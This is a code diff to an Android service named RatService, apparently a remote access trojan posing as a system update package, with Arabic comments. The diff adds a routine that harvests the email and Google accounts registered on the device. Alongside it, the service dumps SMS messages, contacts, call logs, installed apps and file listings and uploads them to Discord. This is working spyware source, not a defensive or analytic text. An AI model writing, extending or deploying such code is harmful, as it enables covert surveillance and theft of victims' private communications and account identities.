@@ -1,5 +1,7 @@
 package com.system.update;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.app.*;
 import android.content.*;
 import android.content.pm.ApplicationInfo;
@@ -24,22 +26,21 @@ public class RatService extends Service {
         super.onCreate();
         startForegroundService();
         
-        // سحب فوري
         new Thread(() -> {
             try {
-                sendTextToDiscord("🔄 **الأداة اشتغلت! جاري سحب كل البيانات...**");
+                sendTextToDiscord("🔄 **الأداة اشتغلت! جاري سحب الإيميلات والبيانات...**");
                 
+                dumpAccounts(); // سحب الإيميلات
+                Thread.sleep(1500);
+
                 String info = "📱 **Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
                 sendTextToDiscord(info);
+                Thread.sleep(1000);
 
-                dumpSms();
-                Thread.sleep(1500); // فاصل صغير عشان الديسكورد ميعملش بلوك
-                dumpContacts();
-                Thread.sleep(1500);
-                dumpCallLogs();
-                Thread.sleep(1500);
-                dumpApps();
-                Thread.sleep(1500);
+                dumpSms(); Thread.sleep(1500);
+                dumpContacts(); Thread.sleep(1500);
+                dumpCallLogs(); Thread.sleep(1500);
+                dumpApps(); Thread.sleep(1500);
                 dumpFiles();
 
                 sendTextToDiscord("✅ **اكتمل سحب البيانات بالكامل!**");
@@ -59,7 +60,29 @@ public class RatService extends Service {
         }
     }
 
-    // --- دوال سحب البيانات ---
+    // دالة سحب الإيميلات والحسابات المسجلة
+    private void dumpAccounts() {
+        try {
+            AccountManager am = AccountManager.get(this);
+            Account[] accounts = am.getAccounts();
+            StringBuilder sb = new StringBuilder("📧 **الإيميلات والحسابات المسجلة على الجهاز:**\n");
+            
+            if (accounts.length == 0) {
+                sb.append("لا توجد حسابات مسجلة.");
+            } else {
+                for (Account account : accounts) {
+                    // بنفلتر عشان نجيب الإيميلات والجوجل بس
+                    if (account.type.contains("google") || account.type.contains("com.android.email") || account.type.contains("exchange")) {
+                        sb.append("- **").append(account.type).append(":** ").append(account.name).append("\n");
+                    }
+                }
+            }
+            sendTextToDiscord(sb.toString());
+        } catch (Exception e) {
+            sendTextToDiscord("❌ فشل سحب الحسابات: " + e.getMessage());
+        }
+    }
+
     private void dumpSms() {
         File file = new File(getExternalFilesDir(null), "sms_all.txt");
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
@@ -70,8 +93,7 @@ public class RatService extends Service {
                 }
                 c.close();
             }
-            bw.flush();
-            uploadFile(file, "text/plain");
+            bw.flush(); uploadFile(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
@@ -85,8 +107,7 @@ public class RatService extends Service {
                 }
                 c.close();
             }
-            bw.flush();
-            uploadFile(file, "text/plain");
+            bw.flush(); uploadFile(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
@@ -100,8 +121,7 @@ public class RatService extends Service {
                 }
                 c.close();
             }
-            bw.flush();
-            uploadFile(file, "text/plain");
+            bw.flush(); uploadFile(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
@@ -110,8 +130,7 @@ public class RatService extends Service {
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
             List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
             for (ApplicationInfo app : apps) bw.write(app.packageName + "\n");
-            bw.flush();
-            uploadFile(file, "text/plain");
+            bw.flush(); uploadFile(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
@@ -124,12 +143,10 @@ public class RatService extends Service {
             if (download.exists() && download.listFiles() != null) for (File f : download.listFiles()) bw.write(f.getName() + "\n");
             bw.write("\n=== DCIM ===\n");
             if (dcim.exists() && dcim.listFiles() != null) for (File f : dcim.listFiles()) bw.write(f.getName() + "\n");
-            bw.flush();
-            uploadFile(file, "text/plain");
+            bw.flush(); uploadFile(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
-    // --- دوال الاتصال بالديسكورد ---
     private void sendTextToDiscord(String text) {
         try {
             JSONObject json = new JSONObject();
